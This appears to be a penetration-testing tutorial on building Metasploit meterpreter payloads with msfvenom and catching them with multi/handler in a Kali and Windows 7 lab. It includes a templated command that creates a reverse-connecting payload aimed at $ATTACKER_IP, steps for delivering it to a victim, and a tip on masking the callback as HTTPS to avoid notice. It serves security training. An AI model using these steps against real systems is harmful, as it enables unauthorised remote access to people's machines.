# Generating Payloads With Msfvenom

## Client-side Attacks

+ A client-side attack is an attack vector that involves coercing a client to execute a malicious payload on their system that consequently connects back to the attacker when executed.

+ Client-side attacks typically utilize various social engineering techniques like generating malicious documents or portable executables (PEs).

+ Client-side attacks take advantage of human vulnerabilities as opposed to vulnerabilities in services or software running on the target system.

**Note**: There's a critical decision depending on the type of system you are targeting. If you are targeting a server that is running on a networking and it is providing services to other hosts, you need to approach the situation with server side attacks, targeting the services directly, like web, ftp or ssh servers. If you are target an end user system, like a workstation or laptop, you need to use client side attacks, where you'll have to generate malicious payloads and make use of a diverse set of social engineering techniques.

+ Given that this attack vector involves the transfer and storage of a malicious payload on the client’s system (disk), attackers need to be cognisant of AV detection.

## Msfvenom

+ Msfvenom is a command line utility that can be used to generate and encode MSF payloads for various operating systems as well as web servers.

+ Msfvenom is a combination of two utilities, namely; msfpayload and msfencode.

**Note**: Msfvenom comes prepackaged with the metasploit framework, so there is no need to install it.

+ We can use Msfvenom to generate a malicious meterpreter payload that can be transferred to a client target system. Once executed, it will connect back to our payload handler and provide us with remote access to the target system.

## Laboratory

For this technical demonstration we won't need a lab environment. We can follow along using a simple kali virtual machine.

- Run `msfvenom` to check some options and a little bit of information about the utility. With msfvenom we can generate staged and non-staged payloads.

- We can list all the payloads using `msfvenom --list payloads`. There's plenty of payloads we can choose from. However, we will focusing on meterpreter payloads to work in conjunction with the metasploit framework. Note that we can differentiate between a x64 payload and a x86 by reading the name. While x86 has a simple name, the x64 version of the payload specifies it in the name. Sometimes the payload also specifies the x86 arch. We can also differentiate between a staged and non-staged payload by looking at the last part of the name. There is a slash between the payload type and the protocol to be used in staged payloads `windows/x64/meterpreter/reverse_http` and it is not present on non-staged payloads `windows/x64/meterpreter_reverse_http`.

**Note**: Take into consideration that x64 payloads will never run in x86 arch. It is a safe play if we use the 32 bit payload if we are not sure if the target is running x64 or x86.

**Note**: Remember that connections that are directed to the attacker machine could be a bit suspicious in logs and networks. So, for example, if you are trying to connect via reverse http in a network that works over https, the best option would be to mask the connection using reverse https instead.

- To generate a malicious payload, we can run `msfvenom -a $ARCH -p $PAYLOAD_NAME LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT -f $FILE_FORMAT > /path/to/new/payload.$FILE_FORMAT` where $ARCH could be x64 or x86 and the $PAYLOAD_NAME should be one of the list we saw previously. The file format can be pass as argument as well and the output name should match the format specified. With this option the payload will be raw, so it won't be encoded. We could also specify the platform it should target, but if not specified, it will fall to the platform specified in the name.

**Note**: The most important things you must specify when crafting the payload is the payload name and the architecture.

**Note**: You cannot change payload architecture or options after creation. You can only create new payloads as needed.

- We can list all formats by running `msfvenom --list formats` notice we have binaries and not compiled payloads.

**Note**: When crafting linux binary payloads, they don't need extension at all as they could be executed right away.

### Transfering Payload to the target

- To transfer the malicious payloads to the target machine, in this case we will start with windows. We need to have a windows 7 machine in the same network as our kali machine. We are going to setup a simple http web server and try to download the payloads to the windows machine from a web browser. Once we setup the web server, we are going to set up the listener using the msfconsole module `multihandler`. We only need to run `use multi/handler` inside the msfconsole and change the payload to the payload we crafted using msfvenom. And we also need to configure the LHOST and LPORT we configured in the payload with msfvenom.

**Note**: When using meterpreter payloads, we need to use the multihandler module to properly handle the connection. Simpler handlers like netcat could not work properly.

- From the windows target machine, enter the browser and download the payloads. Execute them and then you should see something happening on your kali machine, it should open a meterpreter session on the multihandler.

- For linux, we can do exactly the same, or even execute it from kali to test it out. It will connect to the multihandler and establish the meterpreter session.
